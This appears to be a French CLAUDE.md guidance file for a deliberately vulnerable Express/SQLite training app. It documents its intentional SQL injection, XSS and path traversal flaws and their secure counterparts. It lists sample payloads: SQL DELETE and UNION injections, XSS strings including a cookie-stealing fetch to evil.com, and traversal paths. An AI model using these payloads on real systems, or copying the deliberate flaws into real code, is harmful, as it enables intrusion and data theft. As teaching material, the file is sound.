# CLAUDE.md

Ce fichier fournit des directives à Claude Code (claude.ai/code) lors du travail avec le code de ce dépôt.

## Vue d'ensemble du projet

Il s'agit d'un **projet de formation à la sécurité** qui démontre intentionnellement des vulnérabilités d'injection SQL, de Cross-Site Scripting (XSS) et de traversée de répertoires (Path Traversal). La base de code est une API TypeScript/Express avec persistance SQLite et une interface web, construite pour illustrer à la fois les modèles vulnérables et les alternatives sécurisées à des fins pédagogiques.

**CRITIQUE - Vulnérabilités intentionnelles** :

1. **Injection SQL** : `insertMessage()` et `findMessageById()` dans [src/lib/message-repository.ts](src/lib/message-repository.ts) utilisent la concaténation de chaînes au lieu de requêtes paramétrées.

2. **Cross-Site Scripting (XSS)** : La route `GET /` dans [src/lib/app.ts](src/lib/app.ts) appelle `generateHomePage()` depuis [src/lib/templates.ts](src/lib/templates.ts) qui génère du HTML en injectant directement le contenu des messages sans échappement. Tout contenu HTML/JavaScript sera exécuté dans le navigateur des visiteurs. Une version sécurisée (`generateSecureHomePage()`) utilisant l'escaping HTML est disponible à la route `GET /secure`.

3. **Traversée de Répertoires (Path Traversal)** : La route `GET /files/:filename` dans [src/lib/app.ts](src/lib/app.ts) utilise `VulnerableFileRepository` qui sert des fichiers sans valider le paramètre filename. Un attaquant peut utiliser des séquences comme `../` pour accéder à des fichiers en dehors du répertoire public prévu. Une version sécurisée (`GET /secure-files/:filename`) utilisant `SecureFileRepository` avec validation de chemin est disponible.

## Commandes de développement

```bash
# Développement (rechargement automatique)
npm run dev

# Démarrage en production
npm start

# Compiler TypeScript vers dist/
npm run build

# Exécuter les tests
npm test

# Linter
npm run lint

# Exécuter les tests avec base de données en mémoire (isolé)
SQLITE_DB_PATH=':memory:' npm test

# Nettoyer la sortie de build
npm run clean
```

## Variables d'environnement

- `PORT` : Port du serveur HTTP (par défaut : 3000)
- `SQLITE_DB_PATH` : Chemin du fichier de base de données (par défaut : `./data/app.db`, utiliser `:memory:` pour éphémère)

## Architecture

### Structure principale

- **[src/lib/index.ts](src/lib/index.ts)** - Bootstrap HTTP : lit l'env `PORT`, crée le serveur, aucune logique métier
- **[src/lib/app.ts](src/lib/app.ts)** - Instance Express, middleware, gestionnaires de routes (exportés pour les tests unitaires)
- **[src/lib/templates.ts](src/lib/templates.ts)** - Génération du HTML de la page d'accueil (version vulnérable avec XSS intentionnelle et version sécurisée avec escaping HTML)
- **[src/lib/database.ts](src/lib/database.ts)** - Singleton Better-SQLite3, migrations, helpers de messages
- **[src/index.ts](src/index.ts)** - Réexporte les modules lib pour les consommateurs de la racine du package
- **[src/test/](src/test/)** - Fichiers de tests avec le suffixe `*.test.ts`

### Routes

| Méthode | Route | Gestionnaire | Objectif |
|--------|-------|---------|---------|
| GET | `/` | `homeHandler` | Page web principale (vulnérable au XSS) |
| POST | `/` | `homePostHandler` | Crée un message ou supprime tous les messages (si `deleteAll=true`) |
| GET | `/secure` | `secureHomeHandler` | Page web sécurisée (protégée contre XSS) |
| POST | `/secure` | `secureHomePostHandler` | Crée un message sécurisé ou supprime tous les messages |
| GET | `/messages` | `listMessagesHandler` | API : Liste les messages (du plus récent au plus ancien) |
| GET | `/messages/:id` | `getMessageHandler` | API : Retourne un message par id (vulnérable à l'injection SQL) |
| POST | `/messages` | `createMessageHandler` | API : Crée un message (vulnérable à l'injection SQL) |
| GET | `/files/:filename` | `getFileHandler` | API : Sert un fichier du répertoire public (vulnérable à la traversée de répertoires) |
| GET | `/secure-files/:filename` | `getSecureFileHandler` | API : Sert un fichier avec validation de chemin (protégé contre la traversée) |

### Conception du module Database

**Fonction sécurisée** : `executeParameterizedQuery(sql, params)` - Exécution SQL centralisée qui supporte les requêtes paramétrées. Cependant, les helpers vulnérables passent des chaînes concaténées à travers cette fonction, contournant sa sécurité.

**Fonctions vulnérables (intentionnelles)** :
- `insertMessage(body)` - Ligne 127 : Utilise la concaténation de chaînes brutes `INSERT INTO messages (body) VALUES ('${body}')`
- `findMessageById(id)` - Ligne 152 : Utilise la concaténation de chaînes brutes `WHERE id = ${id}`

**Fonctions sécurisées** :
- `listMessages()` - Utilise correctement les requêtes paramétrées
- `clearMessages()` - Helper de test pour réinitialiser l'état de la base de données

### Conception du module File Repository

**Architecture** : [src/lib/file-repository.ts](src/lib/file-repository.ts) implémente un pattern Repository pour la manipulation de fichiers, similaire à [src/lib/message-repository.ts](src/lib/message-repository.ts) pour les messages.

**Implémentation vulnérable** : `VulnerableFileRepository`
- Construit les chemins avec `path.join(baseDir, filename)` sans validation
- Permet la traversée de répertoires via `../` et autres variantes
- Expose les fichiers projet sensibles (package.json, CLAUDE.md, etc.)

**Implémentation sécurisée** : `SecureFileRepository`
- Résout le chemin avec `path.resolve()` pour normaliser tous les `..` et `.`
- Vérifie que le chemin résolu reste dans le répertoire autorisé
- Rejette les tentatives de traversée en retournant `undefined`
- Bloque également les chemins absolus et autres contournements

## Démonstrations de vulnérabilités

### Injection SQL

Voir [src/test/app.test.ts](src/test/app.test.ts) pour des démonstrations annotées :
- **DELETE injection** : `'); DELETE FROM messages; --` dans le body d'un message
- **Boolean-based** : `1 OR 1=1` dans l'ID pour contourner la clause WHERE
- **UNION-based** : `1 UNION SELECT name, sql, '2025' FROM sqlite_master` pour extraire le schéma

### Cross-Site Scripting (XSS)

Voir [src/test/xss.test.ts](src/test/xss.test.ts) pour des payloads commentés :
- **Balise `<script>`** : `<script>alert('XSS')</script>`
- **Événement onerror** : `<img src=x onerror="alert('XSS')">`
- **Balise SVG** : `<svg onload="alert('XSS')">`
- **Iframe javascript:** : `<iframe src="javascript:alert('XSS')">`
- **Vol de cookies** : `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">`
- **Défacement** : `<img src=x onerror="document.body.innerHTML='COMPROMIS'">`

**Interface de test** : Ouvrir `http://localhost:3000` dans un navigateur après `npm start` et tester les payloads XSS directement dans le formulaire.

### Traversée de Répertoires (Path Traversal)

Voir [src/test/path-traversal.test.ts](src/test/path-traversal.test.ts) pour des démonstrations annotées :
- **Classic traversal** : `/files/../package.json` - Accès au répertoire parent
- **Multiple sequences** : `/files/../../CLAUDE.md` - Remontée de plusieurs niveaux
- **URL-encoded** : `/files/%2e%2e/tsconfig.json` - Contournement par encodage URL
- **Backslash** : `/files/..\\package.json` - Traversée Windows
- **Various bypasses** : Double-dot, null bytes, Unicode normalization

**API de test** : Utiliser Swagger `http://localhost:3000/api-docs` pour tester les payloads sur `/files` (vulnérable) et `/secure-files` (sécurisé).

## Approche de test

- Utilise le `node:test` intégré de Node avec `assert/strict`
- Les tests invoquent directement les gestionnaires de routes avec des objets Express `Request`/`Response` simulés
- Évite l'ouverture de sockets HTTP pour des tests plus rapides et compatibles sandbox
- Définir `SQLITE_DB_PATH=':memory:'` pour l'isolation des tests
- Utiliser `clearMessages()` dans la configuration du test (`t.beforeEach`) pour garantir un état propre

Exemple de structure de test tiré de [src/test/app.test.ts](src/test/app.test.ts) :
```typescript
test('POST /messages handler', async (t) => {
  t.beforeEach(() => { clearMessages(); });

  await t.test('description', () => {
    // Implémentation du test
  });
});
```

## Style de code

- TypeScript strict via [tsconfig.json](tsconfig.json) : `noUncheckedIndexedAccess`, `exactOptionalPropertyTypes`, `strict`, `verbatimModuleSyntax`
- Modules ESM avec `"type": "module"` dans [package.json](package.json)
- Extensions `.js` explicites dans les chemins d'import (TypeScript résout à la compilation)
- Indentation de deux espaces, guillemets simples (sauf si interpolation nécessaire)
- camelCase pour les gestionnaires (`listMessagesHandler`), PascalCase pour les classes
- Garder les gestionnaires de routes légers ; centraliser la logique métier dans les modules `src/lib/`
- Helpers de style repository dans [database.ts](src/lib/database.ts) pour la persistance

## Versions sécurisées

### Protection XSS

Une version sécurisée complète a été implémentée pour démontrer les bonnes pratiques de sécurité contre les attaques XSS :

- **Routes** : `GET /secure` et `POST /secure`
- **Protection** : Escaping HTML + Content Security Policy (CSP) + Headers de sécurité
- **Template** : [src/templates/index-secure.html](src/templates/index-secure.html)
- **Fonction** : `generateSecureHomePage()` et `escapeHtml()` dans [src/lib/templates.ts](src/lib/templates.ts)
- **Documentation** :
  - [doc/QUICK-START-SECURE.md](doc/QUICK-START-SECURE.md) - Guide de démarrage rapide (5 min)
  - [doc/SECURE-VERSION-SUMMARY.md](doc/SECURE-VERSION-SUMMARY.md) - Résumé technique (15 min)
  - [doc/XSS-FIXES.md](doc/XSS-FIXES.md) - Documentation complète (30 min)

### Protection Path Traversal

Une version sécurisée pour la traversée de répertoires a été implémentée :

- **Routes** : `GET /secure-files/:filename`
- **Protection** : Résolution et validation du chemin avec `path.resolve()`
- **Repository** : `SecureFileRepository` dans [src/lib/file-repository.ts](src/lib/file-repository.ts)
- **Tests** : [src/test/path-traversal.test.ts](src/test/path-traversal.test.ts) avec 12+ cas de test
- **Documentation** : [doc/PATH-TRAVERSAL.md](doc/PATH-TRAVERSAL.md) - Guide complet (30 min)

## Conventions de commit

- **IMPORTANT** : Ne jamais faire de commits sans demander explicitement à l'utilisateur d'abord
- Sujets courts et impératifs (ex : "Introduire les routes de session utilisateur")
- Rebase/squash le bruit avant de soumettre les PRs
- Les PRs doivent décrire la portée, les risques, les étapes de validation et lier les issues de suivi
- Inclure la sortie CLI ou des captures d'écran pour les changements de comportement
